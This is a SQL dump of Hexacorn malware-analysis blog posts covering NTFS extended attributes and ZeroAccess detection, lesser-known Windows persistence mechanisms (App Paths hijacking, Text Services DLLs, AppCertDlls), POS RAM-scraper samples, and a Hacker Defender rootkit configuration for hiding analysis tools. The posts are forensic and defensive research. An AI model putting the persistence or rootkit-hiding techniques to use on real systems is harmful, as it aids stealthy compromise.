= 0\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 0\r\n      --\r\n      SizeOfContentD          = 72\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_STANDARD_INFORMATION\r\n            CreationTimeQ         = 130036100539989520\r\n            ModificationTimeQ     = 130036100539989520\r\n            MFTModificationTimeQ  = 130036100539989520\r\n            AccessTimeQ           = 130036100539989520\r\n            FlagsD                = 32\r\n            MaxNumOfVersionsD     = 0\r\n            VersionNumberD        = 0\r\n            ClassIdD              = 0\r\n            OwnerIdD              = 0\r\n            SecurityIdD           = 261\r\n            QuotaQ                = 0\r\n            USNQ                  = 0\r\n            CreationTime (epoch)    = 1359136453\r\n            ModificationTime (epoch)  = 1359136453\r\n            MFTModificationTime (epoch)  = 1359136453\r\n            AccessTime (epoch)           = 1359136453\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 48\r\n      LengthOfAttributeD       = 112\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 0\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 2\r\n      --\r\n      SizeOfContentD          = 82\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_FILE_NAME\r\n            ParentID6             = 5\r\n            ParentUseIndexW       = 5\r\n            CreationTimeQ         = 130036100539989520\r\n            ModificationTimeQ     = 130036100539989520\r\n            MFTModificationTimeQ  = 130036100539989520\r\n            AccessTimeQ           = 130036100539989520\r\n            CreationTime (epoch)    = 1359136453\r\n            ModificationTime (epoch)  = 1359136453\r\n            MFTModificationTime (epoch)  = 1359136453\r\n            AccessTime (epoch)           = 1359136453\r\n            AllocatedSizeQ        = 0\r\n            RealSizeQ             = 0\r\n            FlagsD                = 32\r\n            ReparseValueD         = 0\r\n            LengthOfNameB         = 8\r\n            NameSpaceB            = 3\r\n     FileName = test.txt\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 128\r\n      LengthOfAttributeD       = 24\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 24\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 1\r\n      --\r\n      SizeOfContentD          = 0\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_DATA\r\n   --\r\n\r\n   \r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 208\r\n      LengthOfAttributeD       = 32\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 0\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 3\r\n      --\r\n      SizeOfContentD          = 8\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_EA_INFORMATION\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 224\r\n      LengthOfAttributeD       = 40\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 0\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 4\r\n      --\r\n      SizeOfContentD          = 16\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_EA\r\n\nThere are two EA-related entries here:\n\nMFTA_EA_INFORMATION\nMFTA_EA record\n\nManual analysis like this are quite tiring, so we can write a short perl snippet that can help us with postprocessing:\nuse strict;\r\nmy $f=\'\';\r\nmy $l=\'\';\r\nwhile (<>)\r\n{\r\n  s/[\\r\\n]+//g;\r\n  $f = $1 if /FileName = (.+)$/;\r\n  print \"$f has $1 record\\n\" if ($l =~ /(MFTA_EA(_[A-Z]+)?)/);\r\n  $l = $_;\r\n}\nSaving it into ea.pl file, and running it as:\nea.pl mft_list\nproduces the following output:\n\nIdea #4 – Detect ZeroAccess with hmft\nIt’s simple \n\nI ran hmft before the ZeroAccess installation\nThen I infected my test box\nI then ran hmft after the ZeroAccess installation\n\n\nAt this stage, all I had to do was to run ea.pl on both outputs and I got the following results:\n\nOr, for the sake of copy & paste (and web bots :)):\nr:\\>ea.pl before_installation\r\nV20~1.6 has MFTA_EA_INFORMATION record\r\nV20~1.6 has MFTA_EA record\r\n\r\nr:\\>ea.pl after_installation\r\nU has MFTA_EA_INFORMATION record\r\nU has MFTA_EA record\r\nV20~1.6 has MFTA_EA_INFORMATION record\r\nV20~1.6 has MFTA_EA record\r\nU has MFTA_EA_INFORMATION record\r\nU has MFTA_EA record\r\nservices.exe has MFTA_EA_INFORMATION record\r\nservices.exe has MFTA_EA record/span>\r\n\nAs we can see, the malware activity is immediately visible.\nBtw. V20~1.6 is a $MFT FILE record that refers to C:\\Windows\\CSC\\v2.0.6 and is related to Offline files (client-side caching). I don’t have any information about the content of this EA. Perhaps someone will be more curious than me to poke around there \nIdea #5 – Create a Frankenstein’s monster\nUsing EA and ADS (Alternate Data Streams) with a single file is also possible.\nYou can use ea.exe to create such Frankenstein’s monster in 2 simple steps:\n\nby running it first with a  filename only – this will create EA record\nand then re-runing it with a stream name, this will create the ADS, but EA for ADS will fail (sometimes it’s OK to fail :))\n\nThe result is shown on the following screenshot:\n\nUsing hmft and a combination of ea.pl and ads.pl (posted in older post related to HMFT) in a single eads.pl script:\nuse strict;\r\nmy $f=\'\';\r\nmy $l=\'\';\r\nwhile (<>)\r\n{\r\n  s/[\\r\\n]+//g;\r\n  $f = $1 if /FileName = (.+)$/;\r\n  print \"$f has $1 record\\n\" if ($l =~ /(MFTA_EA(_[A-Z]+)?)/);\r\n  print \"$f:$1\\n\" if ($l =~ /MFTA_DATA/&&/AttributeName = (.+)$/);\r\n  $l = $_;\r\n}\nwe can easily detect such beast as well.\nThat’s all, thanks for reading!\nShare this :)', 'Anti-Forensics, Compromise Detection, Forensic Analysis, HMFT, Malware Analysis', 'http://www.hexacorn.com/blog/2013/01/25/detecting-extended-attributes-zeroaccess-and-other-frankensteins-monsters-with-hmft/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (326, 'Permanent Link to Beyond good ol’ Run key, Part 3', 'Hexacorn', 'January 19, 2013 ', 'Possible Autostart/start mechanisms that are built-in ‘natively’ in Windows and also available by means of extra features offered by many applications go beyond typical path locations and registry keys highlighted by popular programs and scripts like Autoruns and SilentRunners. I have covered some of the non-standard persistence techniques in 2 older posts in the series here and here, but as usual – there is always more to write about.\nIn this post I will cover another batch of less known and possibly ‘obscure’ technique that could be potentially used for autostart/start purposes. I write ‘obscure’, because it is not a typical way of doing autostart, but let’s be honest – there is nothing really extraordinary about it – just a simple abuse of built-in features in both OS and applications.\nCode-in-the-middle proxy\nLong story short, it is a well known fact that many existing registry entries and files pointing to or containing code can be modified to introduce a code-in-the-middle proxy (DLL, EXE, etc.) that will be executed/loaded first instead of a legitimate entry. The original entries are preserved so that they can be transparently executed/loaded once malware is running. There are many existing examples of this technique already being used e.g. hijacks of Shell Open Command,  Image File Execution Options , etc., but it is important to remember that this technique can be extended literally to any registry key or file that is loaded either during autostart or often used by users.\nApplication Registration (App Paths) hijacking\nAnother proxy technique that could be used to hijack popular applications relies on registry entries stored under the following key:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\nAs per Microsoft:\nThe entries found under App Paths are used primarily for the following purposes:\n\nTo map an application’s executable file name to that file’s fully qualified path.\nTo pre-pend information to the PATH environment variable on a per-application, per-process basis.\n\nA legitimate entry that can be found on many newer versions of Windows is shown below:\n\nIt is responsible for launching MS Paint program when someone tries to run it using a legacy ‘pbrush.exe’ name.\nOne could add a modification for e.g. calc.exe:\n\nFrom now on, anytime someone tries to run calc.exe manually (e.g. via Start Menu/Run  window), Notepad will be launched. It may not be a main persistence mechanism, but could be used for re-infection purposes on systems that have been cleaned up, but not rebuilt.\nYou can test it (XP needed) by downloading this reg file , then applying it to your Registry and then launching Win+R and typing ‘calc’ or ‘calc.exe’ and hitting enter. Note: It doesn’t work from command line (a mistake in an older version of this post which I correct here).\nText Services (TSF)\nMicrosoft defines Text Services as:\nMicrosoft Windows Text Services Framework (TSF) is a system service available as a redistributable for Windows 2000. TSF provides a simple and scalable framework for the delivery of advanced text input and natural language technologies. TSF can be enabled in applications, or as a TSF text service. A TSF text service provides multilingual support and delivers text services such as keyboard processors, handwriting recognition, and speech recognition.\nFrom a practical point of view, TSF offers ways to extend available input methods by allowing to install support for languages that are not natively supported by Windows. A good example of such extension is Ekaya – an extension for a Myanmar (Burmese) language.\nIn order for TSF to work on Windows XP, one has to enable the ‘Extended support of advanced text services to all programs’:\n\nOn Windows 7, it is enabled by default (but to install a TSF DLL one requires administrator privileges).\nExamples on how to use TSF are provided in Microsoft SDK (look for ‘Samples\\winui\\Input\\tsf\\TextService’ directory). For the purpose of this article, I just picked up the simplest possible example i.e. a project from the ‘Samples\\winui\\Input\\tsf\\TextService\\TextService-Step01’ subdirectory and updated it with a trivial cosmetic change – a call to OutputDebugString so that we can observe processes loading and unloading our test DLL.\nBOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID pvReserved)\r\n{\r\n  TCHAR szFileFullPath[256];\r\n  TCHAR buf[300];\r\n    switch (dwReason)\r\n    {\r\n        case DLL_PROCESS_ATTACH:\r\n\r\n            g_hInst = hInstance;\r\n            GetModuleFileName (NULL,szFileFullPath,256);\r\n             _tcscpy (buf, TEXT(\"TSF DLL loaded: \"));\r\n             _tcscat (buf, szFileFullPath);\r\n            OutputDebugString(buf);\r\n            if (!InitializeCriticalSectionAndSpinCount(&g_cs, 0))\r\n                return FALSE;\r\n\r\n            break;\r\n\r\n        case DLL_PROCESS_DETACH:\r\n\r\n            GetModuleFileName (NULL,szFileFullPath,256);\r\n             _tcscpy (buf, TEXT(\"TSF DLL unloaded: \"));\r\n             _tcscat (buf, szFileFullPath);\r\n            OutputDebugString(buf);\r\n\r\n            DeleteCriticalSection(&g_cs);\r\n\r\n            break;\r\n    }\r\n\r\n    return TRUE;\r\n}\nOnce registered with Regsrv32.exe:\nregsvr32 TextService-Step01.dll\n\nthe DLL is now active and it will now be loaded to each new process utilizing Text Services (pretty much every single GUI application, including these already running) as can be shown via DebugView from Sysinternals.\nRunning a few test applications shows the following output in DebugView:\n\nOf course, it survives the reboot and is loaded next time user logs on and applications are executed + it works under Windows 7 without any problem:\n\nYou may be wondering if there is any visual indication of the DLL being present on the system.\nThere is.\nIf you look at the legitimate software like aforementioned Ekaya – it adds a set of icons to the Language Bar:\n\nand\n\nIt can be also seen in Text Services and Input Languages section (you can find it under Regional Settings):\n\nThere is no requirement for TSF DLLs to add extra features to the Language Bar, so the Text Services and Input Languages section under Regional Settings is the only place where it is possible to spot the loaded DLL – for our test sample it looks like this:\n\nDLL load order\nThis is a trick relying on  DLL load order – it has been covered on many security blogs in last 2 years so I just mention it for completeness – there are many DLLs that can be ‘injected’ into a loading process of many popular programs. Two of them: fxsst.dll and ntshrui.dll have been covered by Nick Harbour from Mandiant in his posts from July 2010 and June 2011.\nIIS Server Extensions (ISAPI filters)\nIn my older post I mentioned plugins and various extensions that can be loaded into various applications. There are really a lot of possibilities here, including multum of popular software, Windows Shell extensions, aforementioned Text services, IME, URL handlers, and so on and so forth. There are also possibilities of writing server environment-specific extensions e.g. ISAPI filters: As per the information on the page\nEvery ISAPI filter is contained in a separate DLL that must export two entry-point functions, GetFilterVersionand HttpFilterProc, and optionally export the TerminateFilter function. The metabase property, FilterLoadOrder, contains a list of all filters that IIS loads when the Web service is started.\n AppCertDlls\nThis is also a known technique – it has been researched and published by EP_X0FF in 2007 on sysinternals forum. There were a few follow-up posts about it, and a sample code can be found here, here and here. If you are interested you may also read ReactOS code that implements this feature here (search for ‘BasepIsProcessAllowed’).\nUsing a slightly modified code from one of the posts, we can build a DLL to demonstrate how it works.\nFirst we need to add a registry key:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\nthen any REG_EXPAND_SZ value pointing to a DLL we have built.\n\n Now we need to restart the system to ensure a system-wide coverage. For testing purposes, it is okay to restart Windows Explorer so that it can refresh its internal program state to include these DLL in a process creation sequence. Or, one can simply launch cmd.exe and then run programs from command line to observe the DLL being loaded into each newly created process:\n\n You may be wondering how it works under 64-bit system. It works pretty well.\nIn fact, you can register both 32-bit and 64-bit DLLs as a notification on a 64-bit system:\n\nto ensure notifications will be processed for both 64-bit and 32-bit programs:\n \n\n \nThat’s all ! Thanks for reading!\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (327, 'Permanent Link to Malware attacking POS systems', 'Hexacorn', 'December 19, 2012 ', 'Recently there has been quite a lot of technical posts about RAM scrappers targeting Point Of Sale (POS) systems i.e. malware stealing track data directly from memory of the systems involved in processing of credit cards within the Payment Card Industry (PCI). I am speaking – of course – about Dexter malware. You can find selected (good, technical and informative) articles covering this particular malware here: Verizon, Seculert, Volatility Labs, Trustwave.\nIt’s good to see that the actual samples are now being either shared publicly or at least discussions about their internals are becoming available for a public eye. Xylitol is definitely leading here as he has been talking about this topic and specific samples a few times this year (example here and here), and sporadically, some of the PFI companies write a blog or two, or present their findings on security conferences. One thing worth to mention here is that some ‘juicy’ knowledge about specific RAM scraping samples has been shared many times in the past, but it has never gained as much exposure as it probably should e.g. many hashes of RAM scrapers have been mentioned in public advisories from card schemes e.g. here, here, and here. Still, access to the actual samples is very limited plus the hashes of samples keep changing (they are often recompiled for each new compromise).\nRAM Scraping and theft of data in transit\nWhat is ‘RAM Scraping’?\nRAM scraping is a different way of saying that malware reads and parses data directly from a memory (or a file containing memory dump) of a legitimate application responsible for credit card processing. Such ‘sniffing’ is usually scheduled to run at regular intervals. The malware can also directly ‘plug’ or hook into the payment application’s internals and analyze content of its buffers used to temporarily store credit card data in transit.\nRAM scraping is not a new idea, many carding attacks within at least last 5 years are relying on this technique and are described in detail by Trustwave and Verizon Business – well-known security companies that specialize in PFI investigations. The RAM scraping technique is extremely simple, effective and… quiet – except for the time when hackers come to the system to install the malware and occasionally come back to extort accumulated data, there is not much of suspicious or easily identifiable activity going on on the compromised system.\nIt’s the ‘in transit’ aspect of RAM scraping that makes the attack so successful; even if the credit card data never touches the disk (e.g. on a properly hardened and configured system), the malware can still intercept it as it is injected into a transaction process and actively participates in it as an ‘observer’. It acts in a way similar to a man-in-the-middle attack with no modification of data involved (in other words, whatever application is processing – it will be first ‘seen’ by malware before it is passed to the legitimate payment processing application; and this is when data gets sniffed/stolen/dumped).\nIn the first method of RAM scraping mentioned above  the malware acts as an active ‘observer’ of other processes memory constantly analyzing it and looking for card data. It uses a ReadProcessMemory API to access the memory of a targeted process.\nThe second one is more complex as it interacts directly with a targeted application – it can be a patched / modified binary or code patching of the running application – writing such patch requires either a good familiarity (on a programmatic level) with the payment application or the attacker needs to spend some time reverse engineering the application internals to know where to hook into its card processing functions. In a way, it is like a plugin code attached to the legitimate software. A very good example of the complex malware using this technique was the infamous ATM malware described first by Threatexpert back in 2009.\nThe malware targeting POS systems comes in all flavors. It is written in perl, python, .NET, Delphi, C, and sometimes these are just legitimate applications modified to serve malicious purpose e.g. winpcap, ngrep, etc..\nThere is currently no good protection for this kind of attack on a software level (although system hardening, blocking access to process’ memory or immediately cleaning buffers used for credit cards and even introducing dummy yet incorrect track data inside the application buffers /randomly/ could possibly help; if you are merchant, ask POS vendors about it; if you are POS vendor, feel free to ask me more about it).\nOther types of POS malware & hacking techniques\nFor the sake of completeness it is worth mentioning that some malware variants include code to cover other areas of the system as well and apart from memory scraping they can sniff unencrypted track data from network (again ‘data in transit’), or use traditional keyloggers to intercept track data directly as it enters the system used for swiping the cards e.g. in hotels or restaurants (card readers present themselves to the system as a keyboard, hence track data can be intercepted via keystroke interception).\nOne can find PAN/Track harvesters working as sniffers putting network card interface in a promiscuous mode, or as specific modules injected into specific processes (more targeted approach), keyloggers,  screen grabbers, and so on and so forth. Some techniques are even simpler – enabling legitimate flags/settings responsible for debugging purposes or to enable logs, or sometimes even simply increasing log verbosity allows to change the behavior of the POS application so that it will start storing PANs/Track data (and the hacker just needs to re-visit system a bit later to harvest the data). In some cases attackers also downgrade the applications to restore older, vulnerable versions of POS software on the compromised system. Such modifications are usually very subtle and since they don’t even require malware to be active on the system – very hard to detect.\nOn the server side, the attacker may change the script responsible for card processing to transfer data to the attacker’s destination immediately after site users enter them – sometimes such data is stored in a local file as well. Other attacks rely on SQL injection and card data is dumped directly from the database to attacker’s client/tool. Older malware would also use SMTP or FTP to transfer data out in a real-time, but it’s really old school and doesn’t work in more and more environments. While ‘smash and grab’ approach still works, the mission to ‘stay quiet and steal as long as possible’ is a trend growing over last few years. Using a cliche metaphor, hackers now build oasis-like wells that act as card reservoirs to which they come back to fetch new harvested data once in a while.\nExample malware attacking POS\nI will describe here a a few specific examples of malware targeting POS systems. There are not too many publicly available samples available, but since now they are out there in the wild for quite some time (thanks to Xylitol for sharing the samples via his blog), let’s get to business and describe what we got there…\nlanst.exe\nMD5         D770ADBEE04D14D6AA2F188247AF16D0\nSHA1        2474EC06E46605D60AC2B04B20998EB052AF275F\nIt’ s a perl2exe compiled executable.\nPerl2exe executables contain an encrypted perl code that is decrypted during run-time and interpreted by the embedded perl processor/interpreter; because of this, we can extract the perl code during run-time.\nLanst.exe’s perl code looks like this (we can save it as lanst.pl and even run):\n\nIt is obvious from looking at the screenshot that there seem to be some funny unrecognized characters in the source code.\nIt’s a good occasion to use hstrings:\nhstrings  -ps0 lanst.pl > lanst.pl.probe\nIt will probe all the encodings it knows and save the output data into lanst.pl.probe file.\nBrowsing through lanst.pl.probe file using Total Commander’s Lister we can see\n\n \nOkay, so encoding is cp866,OEM Russian; Cyrillic (DOS).\nWe can now go back to lanst.pl and use Lister’s Encodings menu to change the default encoding to 866.\n\nEt voilà!\nWe get a nice Perl code with Russian comments:\n\nThe code itself is not that interesting – it is a boring card scanner that tries to check if the attacked system stores any track data; it is multithreaded, can scan local system, its shares and computers in a domain. It also allows for file and file extensions exclusion/inclusion to speed up system analysis. Admittedly, it is a a nicely written triage script. And yes, I lied – it is actually quite interesting after all – a very efficient code that does exactly what is supposed to do in only a few dozen of lines in perl.\nNotably, the source code includes a version number 1.4a\n$version=\"Version 1.4a MultiThread from 22.04.2008\";\nand a code that prevents it from running if it is executed after a certain date.\n$dietime = 1207392905+(86400*30*2);\r\nif ( time  > $dietime ) { die(\"Can\'t open Handle/Tie.PM!\"); };\nThis variant ‘dies’ if the date is 60 days past Sat, 05 Apr 2008 10:55:05 GMT – as you can see from the code above, it produces a misleading error message if executed at a wrong time.\nLet’s take two important notes here:\n\nIt is a very old sample! And since its version is 1.4, the earlier versions must exist.\n\n\nIf you read my older post, you may recall that built-in ‘expiration date’ is one of the reasons why dynamic analysis is often not enough\n\nA simple test on a dirty box (with a dummy Track data inside the track_samples.txt file) produces the following output:\n\nQuite a nicely behaving hacking tool, isn’t? The guys who run it must feel really happy when they see it hitting the jackpot. Not so funny though if the track data comes from your own card that you have used at the compromised restaurant a few months ago.\nAnother aspect worth mentioning, the code creates various output files: ccfind.log is the most important amongst them as it contains the track data found on the scanned system together with the file names. If you came across this file on your case, congratulations – you have found a smoking gun…\n\nThe lanst.exe is both a triage/reconnaissance tool and a harvesting machine that is looking for easy targets on compromised systems i.e. files storing unencrypted track data that are ready for an immediate extortion.\nIt is not a RAM scraper per se, but I describe it here because it can be often found inside the ‘toolchests’. Traces of such tools being used are also a good indicator of a compromise.\ndnsmgr.exe\nMD5         3004CE6CB7C44605CDF971B74DB3A079\nSHA1        F023B5F5CD8B85B266D0A0AD416136FDA27577EF\nAnother perl2exe compiled script. Decompiled code presents itself as yet another card parser that searches for Track1 and Track 2 patterns in a specific set of files. This is a scraper using similar technique to the one used in lanst.exe (regular expressions matching two types of track data) – yet again it is actually not a RAM scraper, but a file scraper.\nIf it sounds a bit confusing, it is because the files it parses are actually memory dumps obtained using a dedicated memory dumping tool. That is, the actual memory dumping part is implemented in a separate program.\nOne note here: memory dumping programs are typically part of hacker’s toolchest and since the functionality is trivial and easy to implement they are not described in this post; notably, memory dumping/parsing techniques are not carding/hacking-specific – many reverse engineers, penetration testers, and other security pros often use such tools during malware analysis, debugging sessions, pentesting or auditing gigs. Gaming cheat engines also use the same functionality.\nGoing back to dnsmgr.exe – as mentioned, there are two components involved here:\n\none is a memory dumper that enumerates memory blocks from the process(es) that is/are of carders’ interest e.g. application processing card data\nsecond one is a parser (dnsmgr.exe) – it analyzes the dumped data looking for track 1 and 2 patterns – fragment of the parser are shown below.\n\n\nIt is a first generation of RAM scraping malware and as you can see it is not very advanced on a programmatic level, but worked well for quite some time (at least 3 years AFAIK; some may still be present on some POS systems even today!)\nSecond generation of RAM scrapers combined memory dump&parsing functionality into a small executable as shown in a next example.\nrdasrv.exe\nMD5         D9A3FB2BFAC89FEA2772C7A73A8422F2\nSHA1        06A0F4ED13F31A4D291040AE09D0D136D6BB46C3\nThis is a second generation of RAM scrapers; it has been already described by various AV companies – so here just for the completeness: it is a code written in Delphi that runs as a service; it enumerates memory blocks of processes and reads them one by one, on the way utilizing regex patterns that match Tracks 1 and 2 – whatever matches theses patterns is intercepted and preserved in a locally created file.\n\nAs mentioned earlier, it is a service, so it has to be installed, then started:\n\nWhile running, it creates a c:\\windows\\system32\\data.txt file that contains intercepted information – Track data:\n\nLast, but not least, it can be also uninstalled:\n\ncompenum.exe\nMD5         BCC61BDF1A2F4CE0F17407A72BA65413\nSHA1        B026397615ED9B63396EB5A4DF102DB706992E0E\nMD5         C5C3341FBDD38C041E550D5DFF187A8F\nSHA1        6686CE1C9B9809034333EEBD546523AE91491DB6\nTwo samples that are simple LAN recon/enumeration tools – they utilize WNet* functions to enumerate resources. They accept 3 command line arguments: -nocomment, -domains, -fullinfo and BCC61BDF1A2F4CE0F17407A72BA65413 accepts extra argument -createbat. The meaning of the command line arguments is as follows: extra info on WNET output (NETRESOURCE.lpComment), disable information about domains, output full information, output everything to a batch file (‘play.bat’ or ‘p’).\nConclusion\nThese are old samples and there is nothing new here; RAM scraping malware is not very complex when compared to far more advanced families like Zeus or ZeroAccess, but this is a enough to harvest credit card numbers and later extort them from compromised systems. There are a lot more variants written by other carding groups yet the samples are not available publicly; most of them work the same way though – user mode components targeting memory of specific processes or all processes using ReadProcessMemory API or direct hooks in the payment applications’ code/libraries; kernel drivers are rare. Dexter’s arrival suggests that POS systems are gaining some attention and may be targeted even more than in previous years.\nIf you admin a POS system don’t be frightened, but consider making a step forward towards getting your systems PCI DSS compliant. While it’s not perfect, it will definitely improve the security posture of your organization.\nShare this :)', 'Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/12/19/malware-attacking-pos-systems/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (328, 'Permanent Link to Hiding env./tools from malware a.k.a. fight fire with fire (but only inside VM)', 'Hexacorn', 'November 25, 2012 ', 'Seasoned malware analysts/reversers/crackers move along – you already know this stuff \nAnalyzing malware is always challenging as there are a few dozen if not hundreds different ways to detect the virtual environment plus other tools used by reversers during dynamic or in-depth analysis – most of these can be easily picked up by malware looking for process names, registry keys, or using one of the undocumented, or semi-documented bugs/features of VMs (usually snippets of code producing different results when executed on a real CPU vs. on a virtual CPU).\nThis short post describes a few ways how to hide VM (main focus on VMWare) and tools – by hiding their files, processes, services + associated with them registry keys/values.\nChanging VM settings\nIt has has been described quite well here.\nHiding Processes only\nIf you need to hide the process only, you can use HideToolz available for a download from Fyyre’s web site.\nWhen the HideToolz is active, the processes marked for hiding are not visible in a Task Manager and can’t be found by normal process enumeration functions.\nThis is what HideToolz sees (processes marked with an asterisk are hidden)\n\n \nAnd this is what Task Manager can see (Process Explorer as well)\n\nHiding Files, Folders, Processes, Services, Registry entries\nWhen it comes to hiding more stuff, one can use help from the good ol’ Hacker Defender rootkit by HolyFather.\nThe rootkit uses a configuration file that allows to specify what we want hidden in the environment and that includes:\n\nfiles/folders\nprocesses\nservices and their associated registry entries\nregistry keys/names/values\n\nTo set up the Hacker Defender one needs to  edit/change the default configuration file into sth along these lines:\n[Hidden Table]\r\nhxd*\r\nvmu*\r\nvmt*\r\nvmw*\r\ntools*\r\nprocexp*\r\nollydbg*\r\n\r\n[Root Processes]\r\nhxd*\r\nvmu*\r\nvmt*\r\nvmw*\r\ntools*\r\nprocexp*\r\nollydbg*\r\n\r\n[Hidden Services]\r\nHackerDefender100\r\nvmu*\r\nvmt*\r\nvmw*\r\nprocexp*\r\n\r\n[Hidden RegKeys]\r\nVMware, Inc.\r\nSysinternals\r\n\r\n[Hidden RegValues]\r\nvmu*\r\nvmt*\r\nvmw*\r\n\r\n[Startup Run]\r\n\r\n[Free Space]\r\n\r\n[Hidden Ports]\r\n\r\n[Settings]\r\nPassword=infected\r\nBackdoorShell=cmd.exe\r\nFileMappingName=_.-=[Hacker Defender]=-._\r\nServiceName=HackerDefender100\r\nServiceDisplayName=HXD Service 100\r\nServiceDescription=NT rootkit\r\nDriverName=HackerDefenderDrv100\r\nDriverFileName=hxdefdrv.sys\r\n\r\n[Comments]\nThe new configuration file can be now loaded:\nhxdef100.exe hide.ini\nAnd from now on browsing the folders, files, registry keys, names, values and processes, services lists will be available only to processes listed in  ‘root processes’ section.\nExample: what Regedit sees before installing the rootkit:\n\nand after its installation\n\nWhat Task Manager sees before\n\nand after rootkit installation\n \n\nObviously, the configuration I provided above is far from being perfect. The VM-specific strings are all over the place inside the registry, so we need to do a bit more of a home work. It is also more than likely that your environment uses different paths and tools.\nIt would be ideal if VM product developers allowed to completely hide the tools and the environment from the guest OS by e.g. using simple randomization of names, windows titles, processes’ names etc. –  a simple technique used for years by many antirootkit tools e.g. XUETR and GMER.\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2012/11/25/hiding-env-tools-from-malware-a-k-a-fight-fire-with-fire-but-only-inside-vm/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (329, 'Permanent Link to Top 100+ malicious types of 32-bit PE files', 'Hexacorn', 'November 19, 2012 ', 'Another round of stats – this time the top 100+ most ‘popular’ PE i386 file formats used by malware from over 1.2M samples.\nLegend:\n\nMZ PE i386 = PE 32 bit\nDLL = DLL \nCorrupted or Tricky = for some reason parser failed (usually some PE file tricks)\nAPPDATA xxxxxxxx = appended data followed by first 1-4 characters\nSIG = contains directory entry pointing to signature (often it’s a random garbage though, not stolen certificates)\nDEB = contains debugging information\nCOM = COM library\n.NET = .NET PE\nand lots of names related to various installers\n\n (44.17%)    560067    MZ PE i386\r\n  (6.59%)     83554    MZ PE i386 DLL\r\n  (6.16%)     78149    MZ PE i386 Corrupted Tricky\r\n  (4.84%)     61379    MZ PE i386 DEB\r\n  (3.51%)     44529    MZ PE i386 APPDATA 00000000\r\n  (2.99%)     37871    MZ PE i386 SIG\r\n  (2.81%)     35644    MZ PE i386 Tricky\r\n  (2.01%)     25462    MZ PE i386 DLL COM\r\n  (1.30%)     16478    MZ PE i386 NullSoft 2.46-1 SIG\r\n  (1.28%)     16253    MZ PE i386 DLL DEB\r\n  (1.28%)     16220    MZ PE i386 .NET\r\n  (1.04%)     13128    MZ PE i386 SYS\r\n  (0.98%)     12459    MZ PE i386 Tricky SIG\r\n  (0.92%)     11614    MZ PE i386 NullSoft Unknown\r\n  (0.82%)     10393    MZ PE i386 InnoSetup\r\n  (0.78%)      9831    MZ PE i386  AutoIt or AutoHotKey\r\n  (0.77%)      9709    MZ PE i386 Corrupted Tricky DEB\r\n  (0.65%)      8273    MZ PE i386 .NET APPDATA 00000000\r\n  (0.65%)      8217    MZ PE i386 DEB SIG\r\n  (0.64%)      8166    MZ PE i386 NullSoft 2.46\r\n  (0.61%)      7757    MZ PE i386 DLL APPDATA 00000000\r\n  (0.54%)      6881    MZ PE i386 .NET DEB\r\n  (0.48%)      6131    MZ PE i386 Zip Sfx\r\n  (0.48%)      6054    MZ PE i386 Tricky DEB\r\n  (0.47%)      5938    MZ PE i386 Rar SFX\r\n  (0.46%)      5891    MZ PE i386 NullSoft 2.45\r\n  (0.46%)      5836    MZ PE i386 APPDATA B80E0000\r\n  (0.44%)      5631    MZ PE i386 DLL Corrupted Tricky\r\n  (0.42%)      5318    MZ PE i386 Appended MZ\r\n  (0.42%)      5312    MZ PE i386 APPDATA 01000000\r\n  (0.42%)      5279    MZ PE i386 InstallAware\r\n  (0.41%)      5232    MZ PE i386 Tricky DEB SIG\r\n  (0.40%)      5074    MZ PE i386 NullSoft 2.27\r\n  (0.37%)      4733    MZ PE i386 Trymedia\r\n  (0.36%)      4549    MZ PE i386 APPDATA 00000000 DEB\r\n  (0.36%)      4546    MZ PE i386 APPDATA 3C706172\r\n  (0.34%)      4336    MZ PE i386 SYS DEB\r\n  (0.33%)      4161    MZ PE i386 APPDATA A5B79A82\r\n  (0.29%)      3690    MZ PE i386 NullSoft 2.46 SIG\r\n  (0.23%)      2973    MZ PE i386 Trymedia SIG\r\n  (0.23%)      2925    MZ PE i386 APPDATA 88110000\r\n  (0.23%)      2918    MZ PE i386 .file\r\n  (0.22%)      2799    MZ PE i386 Rar SFX DEB\r\n  (0.22%)      2728    MZ PE i386 APPDATA B00E0000\r\n  (0.19%)      2440    MZ PE i386 .NET Tricky\r\n  (0.19%)      2422    MZ PE i386 DLL Tricky\r\n  (0.19%)      2405    MZ PE i386 APPDATA 31353835\r\n  (0.18%)      2255    MZ PE i386 DLL COM 